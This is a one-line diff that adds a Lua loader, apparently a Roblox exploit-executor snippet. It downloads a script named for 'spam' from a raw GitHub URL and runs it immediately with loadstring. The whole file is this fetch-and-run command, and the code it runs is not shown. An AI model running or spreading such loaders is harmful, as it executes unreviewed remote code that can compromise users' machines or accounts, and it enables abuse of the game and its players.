@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TealKnightFree/loaders/main/loaders/scrooms-spam2-tgizrkv8gdlcqw.lua"))()
